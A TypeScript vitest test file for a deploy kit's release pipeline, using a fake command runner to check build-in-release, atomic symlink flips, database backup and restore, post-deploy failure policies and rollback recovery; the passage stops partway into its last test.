import { describe, it, expect } from 'vitest';
import { createRequire } from 'module';

const require = createRequire(__filename);
const kit = require('../index.js') as typeof import('../index');
const release = require('../release.js');
const { mergeConfig, DEFAULT_CONFIG } = kit;

const SHA = 'a1b2c3d4e5f60718293a4b5c6d7e8f9012345678'; // 40 hex

// A content-aware fake execFileSync for the release pipeline. Each capture() call in
// release.js needs a plausible answer (marker, SHA, timestamp, pm2 jlist, /proc cwd,
// df, mv --version, …); everything else returns ''. `fail` forces a thrown failure
// for any command containing one of its substrings (simulates a step erroring).
function makeReleaseRuntime(over: any = {}) {
  const cfg = {
    marker: '{"layout":"releases","version":1}',
    mvVersion: 'mv (GNU coreutils) 9.1',
    dfAvail: '99999999',
    ts: '20260710T090000Z',
    sha: SHA,
    builtSha: SHA,
    canonical: '/srv/app/releases/a1b2c3d4e5f6a1b2-20260710T090000Z',
    runningSha: SHA,
    restartTime: 5,
    backupId: '/var/lib/smarthome/backups/smarthome-20260710T090000Z.db.gpg', // absolute path, the real shape
    releasesList: 'a1b2c3d4e5f6a1b2-20260710T090000Z\n00000000aaaa-20260709T090000Z\n00000000bbbb-20260708T090000Z',
    currentLink: 'releases/00000000aaaa-20260709T090000Z',
    previousLink: 'releases/00000000bbbb-20260708T090000Z',
    tracked: '',
    stateContent: '', // what `cat .deploy-kit-state.json` returns (interrupted-deploy guard)
    fail: [] as string[],
    ...over,
  };
  const calls: string[] = [];
  const inputs: Array<{ command: string; input: string | undefined }> = [];
  // Model PM2 stop/start so the GATED, verified writer-stop can be exercised: a
  // `pm2 stop` marks apps stopped; a start/restart brings them back online.
  const stopped = new Set<string>();
  const execFileSync = (_file: string, args: string[], options: { input?: string } = {}) => {
    const cmd = args[args.length - 1];
    calls.push(cmd);
    inputs.push({ command: cmd, input: options.input });
    if (cfg.fail.some((f: string) => cmd.includes(f))) {
      const err: any = new Error(`fake failure: ${cmd}`);
      err.stdout = '';
      throw err;
    }
    if (/pm2 stop /.test(cmd)) { if (!cfg.stopIneffective) stopped.add('app'); return ''; }
    if (/pm2 (startOrRestart|start|restart)/.test(cmd)) { stopped.clear(); return ''; }
    if (cmd.includes('cat') && cmd.includes('deploy-kit-state.json')) return cfg.stateContent;
    if (cmd.includes('.deploy-kit-layout')) return cfg.marker;
    if (cmd.includes('mv --version')) return cfg.mvVersion;
    if (cmd.includes('df -kP')) return cfg.dfAvail; // fake stands in for the awk-extracted avail column
    if (cmd.includes('date -u')) return cfg.ts;
    if (cmd.includes('rev-parse HEAD')) return cfg.builtSha;
    if (cmd.includes('rev-parse')) return cfg.sha;
    if (cmd.includes('readlink -f')) return cfg.canonical;
    if (cmd.includes('pm2 jlist')) {
      return JSON.stringify([{ name: 'app', pid: 111, pm2_env: { status: stopped.has('app') ? 'stopped' : 'online', restart_time: cfg.restartTime } }]);
    }
    if (cmd.includes('readlink ') && cmd.includes('/current')) return cfg.currentLink;
    if (cmd.includes('readlink ') && cmd.includes('/previous')) return cfg.previousLink;
    if (cmd.includes('ls -1')) return cfg.releasesList;
    if (cmd.includes('git ls-files')) return cfg.tracked;
    if (cmd.includes('get-running-sha')) return cfg.runningSha;
    if (cmd.includes('run-backup')) return cfg.backupId;
    if (cmd.includes('curl')) return '200';
    return '';
  };
  return { runtime: { execFileSync }, calls, inputs, cfg };
}

const relConfig = (over: any = {}) => mergeConfig(DEFAULT_CONFIG, {
  host: 'app@pi',
  projectDir: '/srv/app',
  appNames: ['app'],
  dbBoundApps: ['app'],
  branch: 'master',
  ecosystemFile: 'shared/ecosystem.config.cjs',
  health: { attempts: 2, delaySeconds: 0 },
  hooks: {
    install: 'npm ci',
    build: 'npm run build',
    backup: 'run-backup',
    migrate: 'run-migrate',
    restore: 'run-restore',
  },
  layout: {
    type: 'releases',
    keepReleases: 4,
    sharedPaths: ['.env'],
    releaseChecks: [{ name: 'prisma-client-loads', command: 'check-prisma' }],
    runningShaCommand: 'get-running-sha',
  },
  ...over,
});

const ctx = (runtime: any) => ({ runtime, sleep: () => {} });

describe('release deploy — happy path', () => {
  it('builds inside the release, then flips current atomically', () => {
    const { runtime, calls } = makeReleaseRuntime();
    const result = release.deployRelease(relConfig(), {}, ctx(runtime));
    expect(result.steps).toEqual(
      ['materialize', 'shared', 'install', 'verify-pins', 'build', 'validate', 'backup', 'migrate', 'flip', 'health', 'prune'],
    );
    expect(result.sha).toBe(SHA);
    expect(result.release).toBe('a1b2c3d4e5f6-20260710T090000Z');
    const joined = calls.join('\n');
    // AC1: install/build run INSIDE the release dir, never in current.
    expect(calls.some((cmd) => /cd \/srv\/app\/releases\/.* npm ci/.test(cmd))).toBe(true);
    expect(calls.some((cmd) => /cd \/srv\/app\/current.*npm ci/.test(cmd))).toBe(false);
    // worktree materialized detached at the resolved SHA.
    expect(joined).toContain(`worktree add --detach /srv/app/releases/a1b2c3d4e5f6-20260710T090000Z ${SHA}`);
    // Fetch MUST use an explicit refspec so a `git clone --bare` repo (no configured
    // refspec) actually updates refs/heads/* — else it builds a stale sha (SMH-116).
    expect(joined).toContain("fetch --prune 'origin' '+refs/heads/*:refs/heads/*'");
    // atomic activation via mv -Tf onto current.
    expect(calls.some((cmd) => /mv -Tf .*\/srv\/app\/current/.test(cmd))).toBe(true);
    // ordering: install → build → stop → backup → migrate → flip.
    const idx = (s: string) => calls.findIndex((cmd) => cmd.includes(s));
    expect(idx('npm ci')).toBeLessThan(idx('npm run build'));
    expect(idx('npm run build')).toBeLessThan(idx('pm2 stop app'));
    expect(idx('pm2 stop app')).toBeLessThan(idx('run-backup'));
    expect(idx('run-backup')).toBeLessThan(idx('run-migrate'));
    expect(idx('run-migrate')).toBeLessThan(calls.findIndex((cmd) => /mv -Tf .*\/current/.test(cmd)));
  });

  it('resolves the SHA from refs/heads/<branch> when origin/<branch> does not exist (bare clone)', () => {
    // `git clone --bare` maps heads->heads: origin/master does NOT resolve (rev-parse
    // echoes the literal arg), but refs/heads/master does. Deploy must still succeed.
    const rt = makeReleaseRuntime();
    const runtime = {
      execFileSync: (_f: string, args: string[]) => {
        const cmd = args[args.length - 1];
        if (cmd.includes("rev-parse 'origin'/'master'")) return 'origin/master'; // unresolved
        if (cmd.includes("rev-parse refs/heads/'master'")) return SHA;
        return (rt.runtime.execFileSync as any)(_f, args);
      },
    };
    const result = release.deployRelease(relConfig(), {}, ctx(runtime));
    expect(result.sha).toBe(SHA);
    expect(result.steps).toContain('flip');
  });

  it('prefers refs/heads over a STALE origin/<branch> (heads:heads fetch is authoritative)', () => {
    // If repo.git has a heads->remotes/origin refspec, origin/master is only updated by a
    // plain fetch — NOT our heads:heads fetch — so it can be stale after the remote moved.
    // refs/heads/master (force-updated by our fetch) is current and must win.
    const STALE = 'dead00000000dead00000000dead00000000dead';
    const rt = makeReleaseRuntime();
    const runtime = {
      execFileSync: (_f: string, args: string[]) => {
        const cmd = args[args.length - 1];
        if (cmd.includes("rev-parse 'origin'/'master'")) return STALE;       // stale remote-tracking ref
        if (cmd.includes("rev-parse refs/heads/'master'")) return SHA;      // current local head
        return (rt.runtime.execFileSync as any)(_f, args);
      },
    };
    const result = release.deployRelease(relConfig(), {}, ctx(runtime));
    expect(result.sha).toBe(SHA);       // current, NOT the stale origin sha
    expect(result.sha).not.toBe(STALE);
  });

  it('restarts from the stable ecosystem (never a baked release path) and verifies cwd', () => {
    const { runtime, calls } = makeReleaseRuntime();
    release.deployRelease(relConfig(), {}, ctx(runtime));
    expect(calls.some((cmd) => cmd.includes('pm2 startOrRestart /srv/app/shared/ecosystem.config.cjs'))).toBe(true);
    expect(calls.some((cmd) => cmd.includes('readlink -f /proc/111/cwd'))).toBe(true);
    expect(calls.some((cmd) => cmd.includes('get-running-sha'))).toBe(true);
  });

  it('runs post-deploy checks and delivery events after activation', () => {
    const { runtime, calls, inputs } = makeReleaseRuntime();
    const result = release.deployRelease(relConfig({
      postDeployChecks: [{ name: 'public-smoke', command: 'cd current && run-smoke', onFailure: 'rollback' }],
      deliveryEvent: { command: 'cd current && emit-event' },
    }), {}, ctx(runtime));
    expect(result.steps).toContain('post-check:public-smoke');
    expect(result.steps).toContain('delivery-event');
    expect(calls.some((command) => command.includes('cd /srv/app && cd current && run-smoke'))).toBe(true);
    expect(calls.some((command) => command.includes('cd /srv/app && cd current && emit-event'))).toBe(true);
    const event = JSON.parse(inputs.find(({ command }) => command.includes('emit-event'))?.input ?? '{}');
    expect(event.backupReference).toBe('smarthome-20260710T090000Z.db.gpg');
    expect(JSON.stringify(event)).not.toContain('/var/lib/smarthome/backups');
  });

  it('uses the shared db-backup JSON normalizer for release delivery events', () => {
    const backupId = JSON.stringify({
      created: {
        fullPath: '/var/lib/smarthome/backups/smarthome-20260710T090000Z.db.gpg',
        fileName: 'smarthome-20260710T090000Z.db.gpg',
      },
    });
    const { runtime, inputs } = makeReleaseRuntime({ backupId });

    release.deployRelease(relConfig({ deliveryEvent: { command: 'emit-event' } }), {}, ctx(runtime));

    const event = JSON.parse(inputs.find(({ command }) => command.includes('emit-event'))?.input ?? '{}');
    expect(event.backupReference).toBe('smarthome-20260710T090000Z.db.gpg');
    expect(JSON.stringify(event)).not.toContain('/var/lib/smarthome/backups');
  });

  // PKG-135 Finding 7: same non-gating-but-honest treatment as deploy.js's
  // legacy pipeline (Finding 4) — a broken announcement must never fail an
  // already-verified, already-activated release, but "reported" has to mean
  // something observable: a warning plus a delivery status on the result.
  it('a successful delivery event is reflected in the result, with no warning', () => {
    const { runtime } = makeReleaseRuntime();
    const warnings: string[] = [];
    const log = { ...kit.makeLogger(() => {}, () => {}), warning: (m: string) => warnings.push(m) };
    const result = release.deployRelease(relConfig({ deliveryEvent: { command: 'emit-event' } }), {}, { ...ctx(runtime), log });
    expect(result.deliveryEvent).toEqual({ delivered: true });
    expect(warnings.some((w) => /[Dd]elivery event/.test(w))).toBe(false);
  });

  it('a failing delivery event command warns, records delivered:false, and does NOT fail the release', () => {
    const { runtime } = makeReleaseRuntime({ fail: ['emit-event'] });
    const warnings: string[] = [];
    const log = { ...kit.makeLogger(() => {}, () => {}), warning: (m: string) => warnings.push(m) };
    const result = release.deployRelease(relConfig({ deliveryEvent: { command: 'emit-event' } }), {}, { ...ctx(runtime), log });
    expect(result.healthy).toBe(true); // non-gating: still a successful release
    expect(result.steps).toContain('delivery-event');
    expect(result.deliveryEvent).toEqual({ delivered: false });
    expect(warnings.some((w) => /[Dd]elivery event.*failed/.test(w))).toBe(true);
  });

  it('deliveryEvent is absent from the result entirely when not configured', () => {
    const { runtime } = makeReleaseRuntime();
    const result = release.deployRelease(relConfig(), {}, ctx(runtime));
    expect(result).not.toHaveProperty('deliveryEvent');
  });

  it('dispatches through the public deploy() when layout.type is releases', () => {
    const { runtime } = makeReleaseRuntime();
    const result = kit.deploy(relConfig(), {}, ctx(runtime));
    expect(result.release).toBe('a1b2c3d4e5f6-20260710T090000Z');
  });

  it('accepts a PID whose cwd is a SUBDIR of the release (real ecosystem shape)', () => {
    // smarthome-api runs with cwd <release>/packages/api, not the release root.
    const over: any = {};
    const rt = makeReleaseRuntime();
    const subdir = `${rt.cfg.canonical}/packages/api`;
    const runtime = {
      execFileSync: (_f: string, args: string[]) => {
        const cmd = args[args.length - 1];
        if (cmd.includes('readlink -f /proc/')) return subdir;
        return (rt.runtime.execFileSync as any)(_f, args);
      },
    };
    void over;
    expect(() => release.deployRelease(relConfig(), {}, ctx(runtime))).not.toThrow();
  });

  it('verifyActivation rejects a PID whose cwd is OUTSIDE the new release (stale process)', () => {
    const rt = makeReleaseRuntime();
    const runtime = {
      execFileSync: (_f: string, args: string[]) => {
        const cmd = args[args.length - 1];
        if (cmd.includes('readlink -f /proc/')) return '/srv/app/releases/old1-20260709T090000Z';
        return (rt.runtime.execFileSync as any)(_f, args);
      },
    };
    const v = release.verifyActivation(relConfig(), release.releasePaths(relConfig()), SHA, rt.cfg.canonical, ctx(runtime));
    expect(v.ok).toBe(false);
    expect(v.reason).toMatch(/not under/);
  });

  it('verifyActivation fails a crash loop (restart counts climbing across the settle window)', () => {
    let n = 0;
    const rt = makeReleaseRuntime();
    const runtime = {
      execFileSync: (_f: string, args: string[]) => {
        const cmd = args[args.length - 1];
        if (cmd.includes('pm2 jlist')) {
          n += 1;
          return JSON.stringify([{ name: 'app', pid: 111, pm2_env: { status: 'online', restart_time: 5 + n } }]);
        }
        return (rt.runtime.execFileSync as any)(_f, args);
      },
    };
    const v = release.verifyActivation(relConfig(), release.releasePaths(relConfig()), SHA, rt.cfg.canonical, ctx(runtime));
    expect(v.ok).toBe(false);
    expect(v.reason).toMatch(/crash loop/);
  });
});

describe('release deploy — post-deploy failure policy', () => {
  const failingCheck = (onFailure?: string) => ({
    name: 'public-smoke', command: 'run-smoke', ...(onFailure ? { onFailure } : {}),
  });

  it('rejects a missing policy before acquiring the deploy lock', () => {
    const { runtime, calls } = makeReleaseRuntime();
    expect(() => release.deployRelease(relConfig({ postDeployChecks: [failingCheck()] }), {}, ctx(runtime)))
      .toThrow(/onFailure/);
    expect(calls).toEqual([]);
  });

  it('rolls code and migrated data back, verifies the previous release, journals the outcome, and emits failure', () => {
    const { runtime, calls, inputs, cfg } = makeReleaseRuntime({ fail: ['run-smoke'] });
    const config = relConfig({
      postDeployChecks: [failingCheck('rollback')],
      deliveryEvent: { command: 'emit-event' },
    });

    expect(() => release.deployRelease(config, {}, ctx(runtime)))
      .toThrow(/public-smoke \(policy: rollback\)/);

    const lastIndex = (needle: string) => calls.reduce((found, command, index) => (
      command.includes(needle) ? index : found
    ), -1);
    const flipBack = calls.findIndex((command) => command.includes(`ln -s ${cfg.currentLink} /srv/app/.dk-swap.$$.current`));
    expect(lastIndex('pm2 stop')).toBeLessThan(flipBack);
    expect(flipBack).toBeLessThan(lastIndex('run-restore'));
    expect(lastIndex('run-restore')).toBeLessThan(lastIndex('pm2 startOrRestart'));

    const event = JSON.parse(inputs.filter(({ command }) => command.includes('emit-event')).at(-1)?.input ?? '{}');
    expect(event).toMatchObject({
      status: 'failed', failedCheck: 'public-smoke', activeRelease: cfg.currentLink,
      recovery: { policy: 'rollback', outcome: 'rolled-back', verified: true },
    });
    expect(event.backupReference).toBe('smarthome-20260710T090000Z.db.gpg');
    expect(JSON.stringify(event)).not.toContain('/var/lib/smarthome/backups');
    expect(calls.join('\n')).toContain('post-deploy-rolled-back');
  });

  it('keeps a verified candidate active under remain-active and records a degraded event even when its sink fails', () => {
    const probe = makeReleaseRuntime();
    const { runtime, calls, inputs } = makeReleaseRuntime({ fail: ['run-smoke', 'emit-event'] });
    const warnings: string[] = [];
    const log = { ...kit.makeLogger(() => {}, () => {}), warning: (message: string) => warnings.push(message) };
    const config = relConfig({
      postDeployChecks: [failingCheck('remain-active')],
      deliveryEvent: { command: 'emit-event' },
    });

    expect(() => release.deployRelease(config, {}, { ...ctx(runtime), log }))
      .toThrow(/policy: remain-active/);
    expect(calls.some((command) => command.includes(`ln -s ${probe.cfg.currentLink} /srv/app/.dk-swap.$$.current`))).toBe(false);
    expect(calls.some((command) => command.includes('run-restore'))).toBe(false);
    const event = JSON.parse(inputs.filter(({ command }) => command.includes('emit-event')).at(-1)?.input ?? '{}');
    expect(event).toMatchObject({
      status: 'degraded', failedCheck: 'public-smoke', activeRevision: SHA,
      recovery: { policy: 'remain-active', outcome: 'remained-active', verified: true },
    });
    expect(calls.join('\n')).toContain('post-deploy-degraded');
    expect(warnings.some((message) => /on-host release journal/.test(message))).toBe(true);
  });

  it('records manual-decision-required without mutating code or data', () => {
    const probe = makeReleaseRuntime();
    const { runtime, calls, inputs } = makeReleaseRuntime({ fail: ['run-smoke'] });
    const config = relConfig({
      postDeployChecks: [failingCheck('manual')],
      deliveryEvent: { command: 'emit-event' },
    });
    expect(() => release.deployRelease(config, {}, ctx(runtime))).toThrow(/policy: manual/);
    expect(calls.some((command) => command.includes(`ln -s ${probe.cfg.currentLink} /srv/app/.dk-swap.$$.current`))).toBe(false);
    expect(calls.some((command) => command.includes('run-restore'))).toBe(false);
    const event = JSON.parse(inputs.filter(({ command }) => command.includes('emit-event')).at(-1)?.input ?? '{}');
    expect(event.recovery).toEqual({ policy: 'manual', outcome: 'manual-decision-required', verified: true });
    expect(calls.join('\n')).toContain('post-deploy-manual-decision');
  });

  it('journals and emits rollback-failed when the recovery pointer cannot be restored', () => {
    const probe = makeReleaseRuntime();
    const { runtime, calls, inputs } = makeReleaseRuntime({
      fail: ['run-smoke', `ln -s ${probe.cfg.currentLink} /srv/app/.dk-swap.$$.current`],
    });
    const config = relConfig({
      postDeployChecks: [failingCheck('rollback')],
      deliveryEvent: { command: 'emit-event' },
    });
    expect(() => release.deployRelease(config, {}, ctx(runtime))).toThrow(/MANUAL RECOVERY REQUIRED/);
    expect(calls.join('\n')).toContain('post-deploy-rollback-failed');
    const event = JSON.parse(inputs.filter(({ command }) => command.includes('emit-event')).at(-1)?.input ?? '{}');
    expect(event.recovery).toEqual({ policy: 'rollback', outcome: 'rollback-failed', verified: false });
    expect(calls.filter((command) => command.includes('pm2 startOrRestart')).length).toBe(1);
  });

  it('refuses a new deploy after interruption during post-check rollback', () => {
    const { runtime, calls } = makeReleaseRuntime({
      stateContent: '{"phase":"post-deploy-rollback","releaseId":"a1b2c3d4e5f6-20260710T010000Z"}',
    });
    expect(() => release.deployRelease(relConfig(), {}, ctx(runtime))).toThrow(/interrupted mid-"post-deploy-rollback"/);
    expect(calls.some((command) => command.includes('worktree add'))).toBe(false);
  });
});

describe('release deploy — preRestartChecks', () => {
  it('runs IMMEDIATELY BEFORE the pm2 restart, after the current flip', () => {
    const { runtime, calls } = makeReleaseRuntime();
    const cfg = relConfig({ preRestartChecks: [{ name: 'port-safe', command: 'check-port' }] });
    const result = release.deployRelease(cfg, {}, ctx(runtime));
    expect(result.steps).toContain('pre-restart-check:port-safe');
    const flip = calls.findIndex((cmd) => /mv -Tf .*\/current/.test(cmd));
    const check = calls.findIndex((cmd) => cmd.includes('check-port'));
    const restart = calls.findIndex((cmd) => cmd.includes('pm2 startOrRestart'));
    expect(flip).toBeLessThan(check);
    expect(check).toBeLessThan(restart);
  });

  it('a failing preRestartCheck runs the flipped-phase recovery (flips current back)', () => {
    const { runtime, calls } = makeReleaseRuntime({ fail: ['check-port'] });
    const cfg = relConfig({ preRestartChecks: [{ name: 'port-safe', command: 'check-port' }] });
    expect(() => release.deployRelease(cfg, {}, ctx(runtime))).toThrow();
    // The check fails BEFORE the forward pm2 restart, so the only
    // `pm2 startOrRestart` seen is recovery's resume of the PREVIOUS release.
    expect(calls.filter((cmd) => cmd.includes('pm2 startOrRestart')).length).toBe(1);
    // two mv -Tf onto current: forward flip + recovery flip-back.
    expect(calls.filter((cmd) => /mv -Tf .*\/current/.test(cmd)).length).toBeGreaterThanOrEqual(2);
  });

  it('absent preRestartChecks is a strict no-op on the release path too', () => {
    const { runtime: r1, calls: c1 } = makeReleaseRuntime();
    release.deployRelease(relConfig(), {}, ctx(r1));
    const { runtime: r2, calls: c2 } = makeReleaseRuntime();
    release.deployRelease(relConfig({ preRestartChecks: [] }), {}, ctx(r2));
    expect(c2).toEqual(c1);
  });

  it('also gates release rollback, immediately before its restart', () => {
    const { runtime, calls } = makeReleaseRuntime();
    const cfg = relConfig({ preRestartChecks: [{ name: 'port-safe', command: 'check-port' }] });
    release.rollbackRelease(cfg, {}, ctx(runtime));
    const check = calls.findIndex((cmd) => cmd.includes('check-port'));
    const restart = calls.findIndex((cmd) => cmd.includes('pm2 startOrRestart'));
    expect(check).toBeGreaterThanOrEqual(0);
    expect(check).toBeLessThan(restart);
  });
});

// PKG-135 Finding 5: `current` is flipped to the rollback target BEFORE
// preRestartChecks run. Before this fix, a failing check threw straight out
// of rollbackRelease() -- `current` was left pointing at the (unrestarted)
// rollback target while the ORIGINAL process, never restarted, was still
// what was actually serving traffic. The symlink and the running process
// disagreed, which is the worst state to be in mid-incident.
describe('release rollback — post-flip recovery (PKG-135 Finding 5)', () => {
  it('a failing preRestartCheck restores originalCurrent, leaving the symlink consistent with the running process', () => {
    const { runtime, calls, cfg } = makeReleaseRuntime({ fail: ['check-port'] });
    const rbCfg = relConfig({ preRestartChecks: [{ name: 'port-safe', command: 'check-port' }] });

    expect(() => release.rollbackRelease(rbCfg, {}, ctx(runtime)))
      .toThrow(/restored the original release/);

    // Assert the actual symlink target the recovery left behind, not just
    // that it threw: the LAST `ln -s` onto current must point at
    // originalCurrent (cfg.currentLink — what was live before this rollback
    // ever ran), not at the failed rollback target (cfg.previousLink).
    const flipsToPrevious = calls.filter((cmd) => cmd.includes(`ln -s ${cfg.previousLink} `));
    const flipsToOriginal = calls.filter((cmd) => cmd.includes(`ln -s ${cfg.currentLink} `));
    expect(flipsToPrevious.length).toBe(1); // the forward flip, before the check ran
    expect(flipsToOriginal.length).toBe(1); // the recovery flip-back
    const forwardFlipIdx = calls.findIndex((cmd) => cmd.includes(`ln -s ${cfg.previousLink} `));
    const recoveryFlipIdx = calls.findIndex((cmd) => cmd.includes(`ln -s ${cfg.currentLink} `));
    expect(recoveryFlipIdx).toBeGreaterThan(forwardFlipIdx); // the recovery flip landed LAST
    // The running process actually matches the restored symlink: pm2 WAS
    // restarted (by the recovery) after the flip-back, not just the pointer
    // moved — the check fails BEFORE the forward restart ever runs, so the
    // only `pm2 startOrRestart` seen is the recovery's resume of the ORIGINAL
    // release (same shape as the sibling forward-deploy recovery test above).
    expect(calls.filter((cmd) => cmd.includes('pm2 startOrRestart')).length).toBe(1);
    // No flip happened after the recovery one — the symlink is left settled.
    expect(calls.filter((cmd) => cmd.includes('ln -s')).length).toBe(2);
  });

  it('recovery also holds when the restore itself is imperfect — the failure is surfaced, not swallowed', () => {
    // The preRestartCheck fails (triggers recovery); the recovery's OWN
    // verification of the restored originalCurrent ALSO fails (health never
    // returns 200) — an imperfect restore. This must escalate loudly, not
    // silently report success or swallow the original cause.
    const { runtime } = makeReleaseRuntime({ fail: ['check-port', 'curl'] });
    const rbCfg = relConfig({ preRestartChecks: [{ name: 'port-safe', command: 'check-port' }] });
    expect(() => release.rollbackRelease(rbCfg, {}, ctx(runtime)))
      .toThrow(/MANUAL RECOVERY REQUIRED/);
  });

  // PKG-135 Finding B: `activateSymlink(..., { tolerate: true })` neither
  // throws nor reports success/failure on its own -- a blind restart right
  // after it would restart PM2 against WHATEVER `current` still points at,
  // which may still be the rollback target that just failed its check. That
  // is worse than doing nothing. When the recovery's OWN symlink swap fails,
  // PM2 must NOT be touched at all.
  it('when the recovery symlink swap itself fails, PM2 is NOT restarted (never risks activating the failed rollback target)', () => {
    const probe = makeReleaseRuntime();
    const { runtime, calls } = makeReleaseRuntime({ fail: ['check-port', `ln -s ${probe.cfg.currentLink} `] });
    const rbCfg = relConfig({ preRestartChecks: [{ name: 'port-safe', command: 'check-port' }] });

    expect(() => release.rollbackRelease(rbCfg, {}, ctx(runtime)))
      .toThrow(/MANUAL RECOVERY REQUIRED/);

    // The forward flip (to previous) succeeded; only the RECOVERY flip-back
    // (to originalCurrent / cfg.currentLink) failed. Confirm both actually
    // ran, so this test isn't vacuously passing because neither did.
    expect(calls.some((cmd) => cmd.includes(`ln -s ${probe.cfg.previousLink} `))).toBe(true);
    expect(calls.some((cmd) => cmd.includes(`ln -s ${probe.cfg.currentLink} `))).toBe(true);
    // PM2 must never have been restarted -- neither the forward restart
    // (never reached; the check fails first) nor a recovery restart onto a
    // `current` that may still point at the failed rollback target.
    expect(calls.some((cmd) => cmd.includes('pm2 startOrRestart'))).toBe(false);
  });

  it('an unhealthy rollback target (no preRestartChecks involved) still recovers via the same shared path', () => {
    // Regression guard for the refactor that extracted `recoverFailedRollback`
    // out of this pre-existing branch — same behavior, now shared code.
    let verifyCwdCalls = 0;
    const rt = makeReleaseRuntime();
    const runtime = {
      execFileSync: (_f: string, args: string[]) => {
        const cmd = args[args.length - 1];
        if (cmd.includes('readlink -f /proc/')) {
          verifyCwdCalls += 1;
          return verifyCwdCalls <= 1 ? '/srv/app/releases/99999999cccc-20260101T000000Z' : rt.cfg.canonical;
        }
        return (rt.runtime.execFileSync as any)(_f, args);
      },
    };
    expect(() => release.rollbackRelease(relConfig(), {}, ctx(runtime))).toThrow(/restored the original release/);
  });
});

describe('release deploy — failure recovery by phase', () => {
  it('install failure: current keeps serving, apps never stopped, candidate quarantined', () => {
    const { runtime, calls } = makeReleaseRuntime({ fail: ['npm ci'] });
    expect(() => release.deployRelease(relConfig(), {}, ctx(runtime))).toThrow(/npm ci/);
    expect(calls.some((cmd) => cmd.includes('pm2 stop'))).toBe(false);
    expect(calls.some((cmd) => /mv -Tf .*\/current/.test(cmd))).toBe(false);
    expect(calls.some((cmd) => cmd.includes('worktree remove --force'))).toBe(true);
  });

  it('build failure: quarantines candidate, never stops apps or flips', () => {
    const { runtime, calls } = makeReleaseRuntime({ fail: ['npm run build'] });
    expect(() => release.deployRelease(relConfig(), {}, ctx(runtime))).toThrow();
    expect(calls.some((cmd) => cmd.includes('pm2 stop'))).toBe(false);
    expect(calls.some((cmd) => cmd.includes('worktree remove --force'))).toBe(true);
  });

  it('release-check failure: candidate quarantined before the disruptive window', () => {
    const { runtime, calls } = makeReleaseRuntime({ fail: ['check-prisma'] });
    expect(() => release.deployRelease(relConfig(), {}, ctx(runtime))).toThrow();
    expect(calls.some((cmd) => cmd.includes('pm2 stop'))).toBe(false);
    expect(calls.some((cmd) => /mv -Tf .*\/current/.test(cmd))).toBe(false);
  });

  it('backup failure (writers stopped, nothing migrated): resumes previous, no DB restore', () => {
    const { runtime, calls } = makeReleaseRuntime({ fail: ['run-backup'] });
    expect(() => release.deployRelease(relConfig(), {}, ctx(runtime))).toThrow(/backup failed/);
    expect(calls.some((cmd) => cmd.includes('run-migrate'))).toBe(false);
    expect(calls.some((cmd) => cmd.includes('run-restore'))).toBe(false);
    // previous release brought back via the stable ecosystem.
    expect(calls.some((cmd) => cmd.includes('pm2 startOrRestart'))).toBe(true);
  });

  it('migration failure: restores the DB backup and resumes the previous release', () => {
    const { runtime, calls } = makeReleaseRuntime({ fail: ['run-migrate'] });
    expect(() => release.deployRelease(relConfig(), {}, ctx(runtime))).toThrow();
    expect(calls.some((cmd) => cmd.includes('run-restore'))).toBe(true);
    expect(calls.some((cmd) => cmd.includes("DEPLOY_KIT_BACKUP_ID='/var/lib/smarthome/backups/smarthome-20260710T090000Z.db.gpg'"))).toBe(true);
    expect(calls.some((cmd) => cmd.includes('pm2 startOrRestart'))).toBe(true);
  });

  it('activation verify failure (SHA mismatch): flips back, restores DB, resumes previous', () => {
    const { runtime, calls } = makeReleaseRuntime({ runningSha: 'deadbeefdeadbeef' });
    expect(() => release.deployRelease(relConfig(), {}, ctx(runtime))).toThrow(/verification failed/);
    // flip back onto current happened (there are two mv -Tf onto current: forward + back)
    expect(calls.filter((cmd) => /mv -Tf .*\/current/.test(cmd)).length).toBeGreaterThanOrEqual(2);
    expect(calls.some((cmd) => cmd.includes('run-restore'))).toBe(true);
  });

  // PKG-135 Finding B's twin (deployRelease's OWN recover(), 'migrated'/
  // 'flipped'/'verify' phase — same bug as rollbackRelease's
  // recoverFailedRollback, just never fixed there the first time around).
  // This is the SUCCESSFUL-flip-back case, pinned explicitly as the no-
  // regression guard for that fix: the writers-stopped -> flip-back ->
  // DB-restore -> resume ORDER (the Codex #1 comment's sequencing) must be
  // completely unchanged.
  it('successful flip-back during recovery: writers-stopped -> flip-back -> DB-restore -> resume order is unchanged', () => {
    const { runtime, calls, cfg } = makeReleaseRuntime({ runningSha: 'deadbeefdeadbeef' });
    expect(() => release.deployRelease(relConfig(), {}, ctx(runtime))).toThrow(/verification failed/);

    const indicesOf = (needle: string) => calls.reduce<number[]>((acc, cmd, i) => {
      if (cmd.includes(needle)) acc.push(i);
      return acc;
    }, []);
    // `pm2 stop` and `pm2 startOrRestart` each appear TWICE: once in the
    // normal forward flow (pre-migration pause; restarting onto the
    // candidate, before verification ever runs) and once again inside
    // recovery (stopWritersConfirmed()'s own re-check; the resume of the
    // PREVIOUS release). We want recovery's OWN occurrences — the LAST of
    // each — not whichever comes first.
    const stopIdxs = indicesOf('pm2 stop');
    const resumeIdxs = indicesOf('pm2 startOrRestart');
    // The recovery flip-back's exact command: source = st.prevTarget
    // (cfg.currentLink — what WAS current before this deploy), destination =
    // `current` (tmp file ends in ".current"). Distinct from the FORWARD
    // path's own two symlink writes: flipping `current` to the NEW candidate
    // (different source) and updating the `previous` pointer to the old
    // current (same source, but destination "previous", tmp ends in
    // ".previous") — neither of those is this line.
    const flipBackIdx = calls.findIndex((cmd) => cmd.includes(`ln -s ${cfg.currentLink} /srv/app/.dk-swap.$$.current`));
    const restoreIdx = calls.findIndex((cmd) => cmd.includes('run-restore'));

    const recoveryStopIdx = stopIdxs[stopIdxs.length - 1];
    const recoveryResumeIdx = resumeIdxs[resumeIdxs.length - 1];
    expect(stopIdxs.length).toBe(2);
    expect(resumeIdxs.length).toBe(2);
    expect(flipBackIdx).toBeGreaterThanOrEqual(0);
    expect(recoveryStopIdx).toBeLessThan(flipBackIdx);
    expect(flipBackIdx).toBeLessThan(restoreIdx);
    expect(restoreIdx).toBeLessThan(recoveryResumeIdx);
  });

  // PKG-135 Finding B's twin, the actual fix: `activateSymlink(...,
  // { tolerate: true })` neither throws nor reports success on its own — the
  // ORIGINAL code threw the return value away here too and unconditionally
  // resumed the previous release next. If the flip-back itself fails,
  // `current` may still point at the failed CANDIDATE, and restarting PM2
  // would risk activating exactly that — worse than doing nothing. This
  // matters MORE here than in rollbackRelease: it fires when a deploy has
  // already failed mid-flight with a possibly-migrated database.
  it('a FAILING symlink flip-back during recovery does NOT resume the previous release, and surfaces MANUAL RECOVERY REQUIRED naming the still-active candidate', () => {
